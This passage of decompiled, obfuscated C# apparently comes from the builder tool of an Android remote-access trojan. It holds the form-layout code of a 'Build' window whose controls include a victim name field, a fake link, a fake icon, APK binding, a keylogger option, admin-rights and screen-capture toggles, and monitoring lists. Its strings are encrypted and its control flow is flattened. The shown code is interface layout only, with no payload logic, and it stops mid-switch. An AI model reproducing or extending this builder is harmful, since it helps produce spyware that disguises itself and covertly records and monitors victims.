            ((Build) this).Label17.Size = new Size(16, 19);
            num1 = (int) num2 * -427011898 ^ 86462650;
            continue;
          case 761:
            ((Build) this).logbtntext.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 364283549 ^ -2106735769;
            continue;
          case 762:
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).Label13);
            num1 = (int) num2 * -225251399 ^ 687382619;
            continue;
          case 763:
            ((Build) this).Label8.AutoSize = true;
            ((Build) this).Label8.BackColor = Color.Transparent;
            num1 = (int) num2 * 1687363185 ^ 1720309098;
            continue;
          case 764:
            ((Build) this).Label40.Size = new Size(16, 19);
            num1 = (int) num2 * -539696064 ^ 2086027830;
            continue;
          case 765:
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).combotype);
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).Label20);
            num1 = (int) num2 * -1446287022 ^ -349277120;
            continue;
          case 766:
            ((Build) this).removeactiv.Location = new Point(54, 46);
            ((Build) this).removeactiv.Margin = new Padding(4);
            ((Build) this).removeactiv.Name = EXGuarder.\u0036261112C;
            ((Build) this).removeactiv.Size = new Size(35, 30);
            num1 = (int) num2 * -293770877 ^ -1822745951;
            continue;
          case 767:
            ((Build) this).Panel5.TabIndex = 47;
            num1 = (int) num2 * 1104525061 ^ 1792686606;
            continue;
          case 768:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).CheckDraw);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).checkemo);
            num1 = (int) num2 * -1650831071 ^ 1475682653;
            continue;
          case 769:
            ((Build) this).Button1.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1139740967 ^ -479846062;
            continue;
          case 770:
            ((Build) this).CheckAOX = new DrakeUICheckBox();
            num1 = (int) num2 * -1994520329 ^ -1416877495;
            continue;
          case 771:
            ((Build) this).Label50.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -835212593 ^ 970543753;
            continue;
          case 772:
            ((Build) this).checkprotector.Location = new Point(600, 0);
            num1 = (int) num2 * -181839552 ^ -1177369417;
            continue;
          case 773:
            ((Build) this).Label44.ForeColor = Color.White;
            ((Build) this).Label44.Location = new Point(124, 54);
            num1 = (int) num2 * 1085895765 ^ -1031075431;
            continue;
          case 774:
            ((Build) this).Textfakelink.Size = new Size(262, 27);
            ((Build) this).Textfakelink.Style = UIStyle.Custom;
            num1 = (int) num2 * -781564696 ^ -436079324;
            continue;
          case 775:
            ((Build) this).Label41.Name = EXGuarder.\u00333227610;
            num1 = (int) num2 * 1909003882 ^ -1334906763;
            continue;
          case 776:
            ((Build) this).tracklist.Location = new Point(16, 389);
            num1 = (int) num2 * -1269942233 ^ -67927876;
            continue;
          case 777:
            ((Build) this).trgtbkg.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).trgtbkg.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1216643799 ^ 1251909982;
            continue;
          case 778:
            ((Build) this).checkadmin.Cursor = Cursors.Hand;
            num1 = (int) num2 * -573170502 ^ -2014912463;
            continue;
          case 779:
            ((Build) this).fakepanel.Name = EXGuarder.\u00302501107;
            num1 = (int) num2 * -1265518926 ^ 1197079681;
            continue;
          case 780:
            ((Build) this).randomverbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1401779240 ^ 1003849946;
            continue;
          case 781:
            ((Build) this).explainmonitortext.AcceptsTab = true;
            ((Build) this).explainmonitortext.BackColor = Color.Black;
            num1 = (int) num2 * 1232017024 ^ -290166959;
            continue;
          case 782:
            ((Build) this).box.ResumeLayout(false);
            num1 = (int) num2 * -1263865465 ^ -207645533;
            continue;
          case 783:
            ((Build) this).bndbtntext.FillColor = Color.FromArgb(0, 39, 81);
            ((Build) this).bndbtntext.Font = new Font(EXGuarder.\u00339780D77, 16f);
            ((Build) this).bndbtntext.ForeColor = Color.White;
            num1 = (int) num2 * -1742865944 ^ 1319207250;
            continue;
          case 784:
            ((Build) this).panelmonitorb.Controls.Add((Control) ((Build) this).explainmonitortext);
            ((Build) this).panelmonitorb.Dock = DockStyle.Bottom;
            ((Build) this).panelmonitorb.Location = new Point(0, 98);
            num1 = (int) num2 * -1296112296 ^ -1670568915;
            continue;
          case 785:
            ((Build) this).TabPage14.Size = new Size(450, 230);
            num1 = (int) num2 * 1642199347 ^ -1086147284;
            continue;
          case 786:
            ((Build) this).TextSize.BackColor = Color.FromArgb(34, 34, 34);
            num1 = (int) num2 * 1788751733 ^ 1798615442;
            continue;
          case 787:
            ((Build) this).logbtntext.Size = new Size(112, 34);
            num1 = (int) num2 * -1851319150 ^ 242127164;
            continue;
          case 788:
            ((Build) this).Label17.AutoSize = true;
            ((Build) this).Label17.BackColor = Color.Transparent;
            num1 = (int) num2 * 2055551453 ^ 1674832150;
            continue;
          case 789:
            ((Build) this).cusomupdateimg.TabStop = false;
            num1 = (int) num2 * -601770911 ^ -556488992;
            continue;
          case 790:
            ((Build) this).Panel4.SuspendLayout();
            num1 = (int) num2 * -1165792610 ^ -170375391;
            continue;
          case 791:
            ((Build) this).Label47.AutoSize = true;
            num1 = (int) num2 * -867645427 ^ 248183646;
            continue;
          case 792:
            ((Build) this).CheckRecord.Size = new Size(338, 29);
            num1 = (int) num2 * -221901921 ^ 728283785;
            continue;
          case 793:
            ((Build) this).listmonitor.Location = new Point(461, 90);
            num1 = (int) num2 * -1002840569 ^ -417531972;
            continue;
          case 794:
            ((Build) this).PictureBox1.TabIndex = 33;
            num1 = (int) num2 * -943786674 ^ 1384986836;
            continue;
          case 795:
            ((Build) this).Button3.Name = EXGuarder.\u0034B5C2713;
            num1 = (int) num2 * -1882494764 ^ -1103102998;
            continue;
          case 796:
            ((Build) this).DrakeUIAvatar2.TabIndex = 106;
            ((Build) this).DrakeUIAvatar2.Text = EXGuarder.\u00373182D5A;
            num1 = (int) num2 * 996539754 ^ 1645700181;
            continue;
          case 797:
            ((Build) this).trgtbkg.TabIndex = 93;
            num1 = (int) num2 * 171056212 ^ 1890748276;
            continue;
          case 798:
            ((Build) this).checkprotector.TextAlign = ContentAlignment.MiddleLeft;
            num1 = (int) num2 * 554387485 ^ 1832461868;
            continue;
          case 799:
            ((Build) this).TabPage9.TabIndex = 1;
            num1 = (int) num2 * -1962752219 ^ -355487856;
            continue;
          case 800:
            ((Build) this).Panel2.ResumeLayout(false);
            ((Build) this).Panel2.PerformLayout();
            num1 = (int) num2 * 1853447619 ^ 440294730;
            continue;
          case 801:
            ((Build) this).TextVersion.Cursor = Cursors.IBeam;
            num1 = (int) num2 * 1005106641 ^ -619259127;
            continue;
          case 802:
            ((Build) this).bindbodytext.Location = new Point(646, 307);
            num1 = (int) num2 * 1703744903 ^ 214992583;
            continue;
          case 803:
            ((Build) this).Label29.BackColor = Color.Transparent;
            ((Build) this).Label29.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -847032907 ^ 678105325;
            continue;
          case 804:
            ((Build) this).Label2.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -95129755 ^ 349893652;
            continue;
          case 805:
            ((Build) this).Label29.TabIndex = 36;
            ((Build) this).Label29.Text = EXGuarder.\u0032F610B5C;
            num1 = (int) num2 * 946200406 ^ 1677970839;
            continue;
          case 806:
            ((Build) this).Label34.ForeColor = Color.FromArgb(65, 177, 225);
            num1 = (int) num2 * -2018731813 ^ -1607407507;
            continue;
          case 807:
            ((Build) this).Panel8.Size = new Size(450, 33);
            ((Build) this).Panel8.TabIndex = 50;
            ((Build) this).Label39.Dock = DockStyle.Right;
            num1 = (int) num2 * -2120827172 ^ 1856948261;
            continue;
          case 808:
            ((Build) this).Label1.Name = EXGuarder.\u003096B6423;
            ((Build) this).Label1.Size = new Size(46, 24);
            num1 = (int) num2 * 1553108144 ^ -1313150545;
            continue;
          case 809:
            ((Build) this).TextSize.ForeColor = Color.White;
            num1 = (int) num2 * 1748834777 ^ -853474142;
            continue;
          case 810:
            ((Build) this).Generaltext.ForeColor = Color.Red;
            num1 = (int) num2 * 579952740 ^ -207804415;
            continue;
          case 811:
            ((Build) this).namemonitor.Size = new Size(262, 27);
            num1 = (int) num2 * 1749942728 ^ -1480364924;
            continue;
          case 812:
            ((Build) this).CheckHidePrims.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 2066871008 ^ 305881794;
            continue;
          case 813:
            ((Build) this).TABCTRL.SelectedIndex = 0;
            num1 = (int) num2 * -1165831494 ^ 1162424442;
            continue;
          case 814:
            ((Build) this).checkkeepsscreen.Size = new Size(338, 29);
            num1 = (int) num2 * 949677165 ^ 1063468385;
            continue;
          case 815:
            ((Build) this).TabPage10.Location = new Point(0, 55);
            ((Build) this).TabPage10.Name = EXGuarder.\u0033E102424;
            num1 = (int) num2 * -373599258 ^ -1336172889;
            continue;
          case 816:
            ((Build) this).Label2.Text = EXGuarder.\u00372496E14;
            ((Build) this).PictureBox1.BackColor = Color.FromArgb(45, 45, 45);
            num1 = (int) num2 * -454578899 ^ -159238418;
            continue;
          case 817:
            ((Build) this).logbtntext.Location = new Point(479, 468);
            ((Build) this).logbtntext.Margin = new Padding(4, 5, 4, 5);
            ((Build) this).logbtntext.Maximum = (double) int.MaxValue;
            ((Build) this).logbtntext.Minimum = (double) int.MinValue;
            num1 = (int) num2 * -691221476 ^ -760430606;
            continue;
          case 818:
            ((Build) this).checkver.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((Build) this).checkver.Size = new Size(110, 25);
            ((Build) this).checkver.Style = UIStyle.Custom;
            num1 = (int) num2 * -1424360888 ^ 1296499041;
            continue;
          case 819:
            ((Build) this).Panel7.Dock = DockStyle.Fill;
            ((Build) this).Panel7.Location = new Point(0, 0);
            ((Build) this).Panel7.Name = EXGuarder.\u0035E0F042E;
            num1 = (int) num2 * -1787810673 ^ 596291360;
            continue;
          case 820:
            ((Build) this).po.Style = UIStyle.Custom;
            ((Build) this).po.TabIndex = 95;
            num1 = (int) num2 * 1564461886 ^ 1287488683;
            continue;
          case 821:
            ((Build) this).listmonitor.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).listmonitor.RectDisableColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).listmonitor.Size = new Size(481, 328);
            ((Build) this).listmonitor.Style = UIStyle.Custom;
            num1 = (int) num2 * 666461149 ^ -1640856199;
            continue;
          case 822:
            ((Build) this).comboproms.Margin = new Padding(4, 5, 4, 5);
            ((Build) this).comboproms.MinimumSize = new Size(63, 0);
            num1 = (int) num2 * -1610257278 ^ -833522643;
            continue;
          case 823:
            ((Build) this).Label9.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 777340178 ^ -802240208;
            continue;
          case 824:
            ((Build) this).fakepanel.BorderStyle = BorderStyle.FixedSingle;
            ((Build) this).fakepanel.Controls.Add((Control) ((Build) this).Button1);
            ((Build) this).fakepanel.Controls.Add((Control) ((Build) this).Textfakelink);
            num1 = (int) num2 * -152874384 ^ 1373100925;
            continue;
          case 825:
            ((Build) this).Label40.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 925045358 ^ 174425264;
            continue;
          case 826:
            ((Build) this).Label17.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label17.Location = new Point(574, 52);
            num1 = (int) num2 * 1634967661 ^ 1774568775;
            continue;
          case 827:
            ((Build) this).CheckAllPrims.Size = new Size(64, 26);
            ((Build) this).CheckAllPrims.Style = UIStyle.Custom;
            num1 = (int) num2 * -1414656502 ^ 30771138;
            continue;
          case 828:
            ((Build) this).Label21.BackColor = Color.Transparent;
            num1 = (int) num2 * -699167550 ^ -754182918;
            continue;
          case 829:
            ((Build) this).Textfakelink.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num2 * 203851751 ^ 981510677;
            continue;
          case 830:
            ((Build) this).Label43.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 1790941735 ^ -1792033117;
            continue;
          case 831:
            ((Build) this).ToolTip1 = new ToolTip(((Build) this).components);
            ((Build) this).box.SuspendLayout();
            num1 = (int) num2 * 1442727891 ^ -1720933528;
            continue;
          case 832:
            ((Build) this).comboproms.DropDownStyle = UIDropDownStyle.DropDownList;
            num1 = (int) num2 * -1431524929 ^ -950891896;
            continue;
          case 833:
            ((Build) this).checkadmin.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 1615761935 ^ 2074900670;
            continue;
          case 834:
            ((Build) this).TextNameVictim.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).TextNameVictim.ForeColor = Color.White;
            num1 = (int) num2 * 1421399358 ^ 381674803;
            continue;
          case 835:
            ((Build) this).Panel9.Controls.Add((Control) ((Build) this).trakertitle);
            num1 = (int) num2 * -971011014 ^ -4209887;
            continue;
          case 836:
            ((Build) this).Checksuper.ForeColor = Color.White;
            num1 = (int) num2 * 2069586741 ^ -855734611;
            continue;
          case 837:
            ((Build) this).CheckAllPrims.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 1662501830 ^ 369359514;
            continue;
          case 838:
            ((Build) this).tracklist.RectDisableColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1995358554 ^ 1186947055;
            continue;
          case 839:
            ((Build) this).Label30.AutoSize = true;
            ((Build) this).Label30.BackColor = Color.Transparent;
            ((Build) this).Label30.Font = new Font(EXGuarder.\u00339780D77, 10f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -793419673 ^ -131888054;
            continue;
          case 840:
            ((Build) this).TABCTRL = new DrakeUITabControl();
            ((Build) this).TabPage10 = new TabPage();
            num1 = (int) num2 * -530850351 ^ -1218887811;
            continue;
          case 841:
            ((Build) this).delaylabelaccess = new Label();
            num1 = (int) num2 * 2001853746 ^ -150049711;
            continue;
          case 842:
            ((Build) this).cusomupdateimg.Margin = new Padding(4);
            ((Build) this).cusomupdateimg.Name = EXGuarder.\u0031A643546;
            ((Build) this).cusomupdateimg.Size = new Size(363, 409);
            ((Build) this).cusomupdateimg.SizeMode = PictureBoxSizeMode.Zoom;
            ((Build) this).cusomupdateimg.TabIndex = 94;
            num1 = (int) num2 * -1347894032 ^ 896021592;
            continue;
          case 843:
            ((Build) this).CheckQuick.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1351385662 ^ 1438476097;
            continue;
          case 844:
            ((Build) this).Label4.Name = EXGuarder.\u0034E740B4D;
            num1 = (int) num2 * -764921665 ^ -1647613937;
            continue;
          case 845:
            ((Build) this).explaintoolstext.Size = new Size(1004, 138);
            num1 = (int) num2 * -1587809546 ^ -1016034557;
            continue;
          case 846:
            ((Build) this).CheckHidePrims.TabIndex = 89;
            num1 = (int) num2 * -401650254 ^ 2064828229;
            continue;
          case 847:
            ((Build) this).logbtntext.Padding = new Padding(5);
            num1 = (int) num2 * -517153715 ^ -867273416;
            continue;
          case 848:
            ((Build) this).explainmonitortext.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * -842309580 ^ -253731343;
            continue;
          case 849:
            ((Build) this).checkver.ForeColor = Color.White;
            ((Build) this).checkver.FormattingEnabled = true;
            num1 = (int) num2 * -1878234018 ^ -1240629072;
            continue;
          case 850:
            ((Build) this).DrakeUIAvatar1.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -1411265255 ^ 1325089537;
            continue;
          case 851:
            ((Build) this).logbtntext.TabIndex = 48;
            num1 = (int) num2 * -1969406296 ^ 1972363893;
            continue;
          case 852:
            ((Build) this).TABCTRL.FillColor = Color.White;
            num1 = (int) num2 * 1391788554 ^ -452112008;
            continue;
          case 853:
            ((Build) this).bindCtitle.Name = EXGuarder.\u0036D5D4C43;
            num1 = (int) num2 * -1855522706 ^ 126506895;
            continue;
          case 854:
            ((Build) this).Textfakelink.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).Textfakelink.ForeColor = Color.White;
            num1 = (int) num2 * -1127541356 ^ 685424256;
            continue;
          case 855:
            ((Build) this).CheckHidePrims.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).CheckHidePrims.ForeColor = Color.White;
            ((Build) this).CheckHidePrims.Location = new Point(83, 375);
            ((Build) this).CheckHidePrims.Name = EXGuarder.\u0032B525E74;
            num1 = (int) num2 * -1662101183 ^ -1127974498;
            continue;
          case 856:
            ((Build) this).Label42.TabIndex = 106;
            ((Build) this).Label42.Text = EXGuarder.\u0036B110D58;
            ((Build) this).Label40.AutoSize = true;
            num1 = (int) num2 * -596146871 ^ -2126395668;
            continue;
          case 857:
            ((Build) this).CheckDoze.Location = new Point(70, 483);
            num1 = (int) num2 * -922818808 ^ 1572941245;
            continue;
          case 858:
            ((Build) this).Checksuper = new DrakeUICheckBox();
            num1 = (int) num2 * 2136226698 ^ -511296933;
            continue;
          case 859:
            this.Name = EXGuarder.\u003371F595F;
            num1 = (int) num2 * 1358649368 ^ 1358037988;
            continue;
          case 860:
            ((Build) this).explaintoolstext.ReadOnly = true;
            num1 = (int) num2 * 221484409 ^ 390030628;
            continue;
          case 861:
            ((Build) this).Label19.Size = new Size(172, 34);
            num1 = (int) num2 * 474228895 ^ -1326598611;
            continue;
          case 862:
            ((Build) this).Label50.Size = new Size(16, 19);
            num1 = (int) num2 * 2111182890 ^ -1187857634;
            continue;
          case 863:
            ((Build) this).SelectedApk.Name = EXGuarder.\u00357342E2E;
            ((Build) this).SelectedApk.Radius = 10;
            ((Build) this).SelectedApk.RectColor = Color.Lime;
            ((Build) this).SelectedApk.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -194959812 ^ -48450271;
            continue;
          case 864:
            ((Build) this).Panel1.Location = new Point(0, 196);
            num1 = (int) num2 * 141713114 ^ 75799853;
            continue;
          case 865:
            ((Build) this).trackIDtext.Maximum = (double) int.MaxValue;
            ((Build) this).trackIDtext.Minimum = (double) int.MinValue;
            num1 = (int) num2 * -1799110125 ^ 1818966077;
            continue;
          case 866:
            ((Build) this).Label28 = new Label();
            num1 = (int) num2 * -282452576 ^ -879101737;
            continue;
          case 867:
            ((Build) this).Label50.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label50.Location = new Point(55, 413);
            num1 = (int) num2 * 48731490 ^ 1266218508;
            continue;
          case 868:
            ((Build) this).CheckQuick.ForeColor = Color.White;
            num1 = (int) num2 * 47419431 ^ -1523184963;
            continue;
          case 869:
            ((Build) this).TextNameVictim.Minimum = (double) int.MinValue;
            ((Build) this).TextNameVictim.Name = EXGuarder.\u00330084907;
            num1 = (int) num2 * 1749486649 ^ -821691456;
            continue;
          case 870:
            ((Build) this).Panel10.Name = EXGuarder.\u00314214F50;
            ((Build) this).Panel10.Size = new Size(450, 119);
            ((Build) this).Panel10.TabIndex = 99;
            num1 = (int) num2 * 703648271 ^ 1142070282;
            continue;
          case 871:
            ((Build) this).Panel6.ResumeLayout(false);
            ((Build) this).Panel6.PerformLayout();
            num1 = (int) num2 * 449893241 ^ -2059197163;
            continue;
          case 872:
            ((Build) this).Button3.BackColor = Color.Black;
            num1 = (int) num2 * -650436453 ^ -2112973965;
            continue;
          case 873:
            ((Build) this).trgtbkg.Location = new Point(748, 48);
            ((Build) this).trgtbkg.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num2 * -2128351034 ^ 2116707822;
            continue;
          case 874:
            ((Build) this).Primslist = new DrakeUIListBox();
            ((Build) this).removeactiv = new DrakeUIAvatar();
            num1 = (int) num2 * 1908150650 ^ 593888558;
            continue;
          case 875:
            ((Build) this).Label8 = new Label();
            num1 = (int) num2 * 935597688 ^ 1705858869;
            continue;
          case 876:
            ((Build) this).randomidbtn.Cursor = Cursors.Hand;
            num1 = (int) num2 * 871347530 ^ 185966219;
            continue;
          case 877:
            ((Build) this).TextPackage.Maximum = (double) int.MaxValue;
            num1 = (int) num2 * 411408253 ^ 334121077;
            continue;
          case 878:
            ((Build) this).tracklist.BackColor = Color.FromArgb(20, 31, 20);
            ((Build) this).tracklist.FillColor = Color.FromArgb(20, 31, 20);
            ((Build) this).tracklist.FillDisableColor = Color.FromArgb(20, 31, 20);
            num1 = (int) num2 * -380343064 ^ 1823639647;
            continue;
          case 879:
            ((Build) this).Label19 = new Label();
            ((Build) this).checkver = new DrakeUIComboBox();
            ((Build) this).Label48 = new Label();
            num1 = (int) num2 * -283813422 ^ 723450458;
            continue;
          case 880:
            ((Build) this).TabPage10.Size = new Size(1004, 677);
            ((Build) this).TabPage10.TabIndex = 2;
            ((Build) this).TabPage10.Text = EXGuarder.\u0030F696029;
            num1 = (int) num2 * -401346741 ^ 2092693987;
            continue;
          case 881:
            ((Build) this).bindbodytext.BorderStyle = BorderStyle.FixedSingle;
            num1 = (int) num2 * -2052099559 ^ 1640862466;
            continue;
          case 882:
            ((Build) this).Label31.Name = EXGuarder.\u0030F0D0671;
            num1 = (int) num2 * 461319235 ^ -415743923;
            continue;
          case 883:
            ((Build) this).trakertitle.Size = new Size(87, 19);
            num1 = (int) num2 * 1751069321 ^ -1221038751;
            continue;
          case 884:
            ((Build) this).TextNameVictim.Style = UIStyle.Custom;
            num1 = (int) num2 * 826354696 ^ 312893493;
            continue;
          case 885:
            ((Build) this).Label32.Name = EXGuarder.\u003315F0310;
            num1 = (int) num2 * -1419417707 ^ 546018207;
            continue;
          case 886:
            ((Build) this).CheckDraw.CheckBoxColor = Color.FromArgb(30, 136, 229);
            ((Build) this).CheckDraw.Cursor = Cursors.Hand;
            num1 = (int) num2 * 422985846 ^ -1137586866;
            continue;
          case 887:
            ((Build) this).trakertitle.TabIndex = 102;
            num1 = (int) num2 * 466152605 ^ 584224170;
            continue;
          case 888:
            ((Build) this).TabPage12.SuspendLayout();
            ((Build) this).Panel6.SuspendLayout();
            ((ISupportInitialize) ((Build) this).PictureBox2).BeginInit();
            ((Build) this).TabPage13.SuspendLayout();
            ((Build) this).Panel7.SuspendLayout();
            num1 = (int) num2 * -1638375630 ^ -209780680;
            continue;
          case 889:
            ((Build) this).Label46.BackColor = Color.Transparent;
            ((Build) this).Label46.Enabled = false;
            ((Build) this).Label46.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label46.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).Label46.Location = new Point(470, 326);
            num1 = (int) num2 * -363072617 ^ 950685545;
            continue;
          case 890:
            ((Build) this).dscriptext.Name = EXGuarder.\u00332484A5B;
            ((Build) this).dscriptext.Size = new Size(493, 58);
            num1 = (int) num2 * -374771959 ^ 153167680;
            continue;
          case 891:
            ((Build) this).bndbtntext.Location = new Point(730, 437);
            num1 = (int) num2 * 848719413 ^ -1082987802;
            continue;
          case 892:
            ((Build) this).CheckQuick.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -624234854 ^ 1904857729;
            continue;
          case 893:
            ((Build) this).checkadmin.Location = new Point(83, 235);
            ((Build) this).checkadmin.Name = EXGuarder.\u0033B37672F;
            num1 = (int) num2 * -548415221 ^ 203533000;
            continue;
          case 894:
            ((Build) this).TextVersion.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num2 * 103584651 ^ -1773230097;
            continue;
          case 895:
            ((Build) this).TextPackage.Minimum = (double) int.MinValue;
            ((Build) this).TextPackage.Name = EXGuarder.\u00354086C34;
            ((Build) this).TextPackage.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * 1970309100 ^ -1037948923;
            continue;
          case 896:
            ((Build) this).randomverbtn.TabIndex = 100;
            num1 = (int) num2 * 1733622686 ^ -490629006;
            continue;
          case 897:
            ((Build) this).Label41.ForeColor = Color.FromArgb(65, 177, 225);
            num1 = (int) num2 * -1471522069 ^ -824820108;
            continue;
          case 898:
            ((Build) this).Label8.Text = EXGuarder.\u00364775227;
            ((Build) this).Primslist.BackColor = Color.FromArgb(20, 31, 20);
            num1 = (int) num2 * -1278896800 ^ 505366377;
            continue;
          case 899:
            ((Build) this).removeactiv.FillColor = Color.Transparent;
            num1 = (int) num2 * 474345379 ^ -1929153021;
            continue;
          case 900:
            ((Build) this).Label18.Name = EXGuarder.\u0034975264A;
            num1 = (int) num2 * -1310824870 ^ 993488964;
            continue;
          case 901:
            ((Build) this).Notmsg.BorderStyle = BorderStyle.FixedSingle;
            ((Build) this).Notmsg.ForeColor = Color.White;
            num1 = (int) num2 * -108217387 ^ -2136589489;
            continue;
          case 902:
            ((Build) this).checkcatpure.Size = new Size(464, 29);
            num1 = (int) num2 * -2043626863 ^ -1787064935;
            continue;
          case 903:
            ((Build) this).idmonitor.FillColor = Color.Black;
            ((Build) this).idmonitor.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).idmonitor.ForeColor = Color.White;
            ((Build) this).idmonitor.Location = new Point(95, 323);
            ((Build) this).idmonitor.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num2 * -584907511 ^ -116689111;
            continue;
          case 904:
            ((Build) this).Label34.Location = new Point(55, 130);
            num1 = (int) num2 * 2126129262 ^ 896102927;
            continue;
          case 905:
            ((Build) this).TabPage14 = new TabPage();
            ((Build) this).TextBox1 = new TextBox();
            ((Build) this).Panel9 = new Panel();
            num1 = (int) num2 * 1175119545 ^ 1047606109;
            continue;
          case 906:
            ((Build) this).CheckFakeSize.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1862290756 ^ -191981266;
            continue;
          case 907:
            ((Build) this).CheckIconPatch.TabIndex = 76;
            num1 = (int) num2 * 36661781 ^ -2118627119;
            continue;
          case 908:
            ((Build) this).fakepanel.BackColor = Color.Black;
            num1 = (int) num2 * -834114073 ^ 1335811627;
            continue;
          case 909:
            ((Build) this).Label44.AutoSize = true;
            num1 = (int) num2 * 852431412 ^ -661824100;
            continue;
          case 910:
            ((Build) this).fakeiconpic.Size = new Size(97, 63);
            ((Build) this).fakeiconpic.SizeMode = PictureBoxSizeMode.Zoom;
            ((Build) this).fakeiconpic.TabIndex = 42;
            num1 = (int) num2 * 1837255517 ^ -1407176428;
            continue;
          case 911:
            ((Build) this).removeactiv.ForeColor = Color.White;
            num1 = (int) num2 * -174119816 ^ -178607603;
            continue;
          case 912:
            ((Build) this).CheckBIND.Size = new Size(138, 29);
            num1 = (int) num2 * 2037182413 ^ 737492868;
            continue;
          case 913:
            ((Build) this).removmonitor.BackColor = Color.Transparent;
            num1 = (int) num2 * -535909153 ^ 815390801;
            continue;
          case 914:
            ((Build) this).TextNamePatch.Radius = 10;
            ((Build) this).TextNamePatch.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1795347536 ^ 1329722011;
            continue;
          case 915:
            ((Build) this).checkkeyloger.Cursor = Cursors.Hand;
            num1 = (int) num2 * -105845889 ^ 1880254551;
            continue;
          case 916:
            ((Build) this).Button1.Text = EXGuarder.\u00366395F4D;
            num1 = (int) num2 * 433474062 ^ 251624460;
            continue;
          case 917:
            ((Build) this).DrakeUIAvatar1 = new DrakeUIAvatar();
            num1 = (int) num2 * -1041939119 ^ -1859881362;
            continue;
          case 918:
            ((Build) this).Label24.TabIndex = 43;
            num1 = (int) num2 * -216124812 ^ 414093554;
            continue;
          case 919:
            ((Build) this).Label21.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label21.Name = EXGuarder.\u003130E0C4B;
            num1 = (int) num2 * 1085248647 ^ 2076865373;
            continue;
          case 920:
            ((Build) this).checkprotector.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 1237124469 ^ 84506395;
            continue;
          case 921:
            ((Build) this).PictureBox2.Name = EXGuarder.\u00304142743;
            num1 = (int) num2 * 1152790403 ^ -1806896185;
            continue;
          case 922:
            ((Build) this).checkemo.TabIndex = 74;
            num1 = (int) num2 * 1263597537 ^ -1063089676;
            continue;
          case 923:
            ((Build) this).panemnitor.Controls.Add((Control) ((Build) this).removmonitor);
            num1 = (int) num2 * -2089451434 ^ -491860135;
            continue;
          case 924:
            ((Build) this).CheckAllPrims.Text = EXGuarder.\u0035F1D6452;
            ((Build) this).addactiv.AvatarSize = 30;
            ((Build) this).addactiv.BackColor = Color.Transparent;
            num1 = (int) num2 * 440959916 ^ -385237010;
            continue;
          case 925:
            ((Build) this).randomidbtn.BackColor = Color.Transparent;
            num1 = (int) num2 * -806537692 ^ -124757401;
            continue;
          case 926:
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).CheckDoze);
            num1 = (int) num2 * -2081990638 ^ 901925241;
            continue;
          case 927:
            ((Build) this).checkcatpure.TextAlign = ContentAlignment.TopCenter;
            ((Build) this).TabPage14.BackColor = Color.White;
            num1 = (int) num2 * -548130928 ^ 2009621175;
            continue;
          case 928:
            ((Build) this).checkkeepsscreen.CheckBoxColor = Color.FromArgb(192, 0, 0);
            ((Build) this).checkkeepsscreen.Cursor = Cursors.Hand;
            ((Build) this).checkkeepsscreen.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).checkkeepsscreen.ForeColor = Color.White;
            ((Build) this).checkkeepsscreen.Location = new Point(83, 340);
            num1 = (int) num2 * -870887031 ^ -347294749;
            continue;
          case 929:
            ((Build) this).Button1.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1813786680 ^ -1259873248;
            continue;
          case 930:
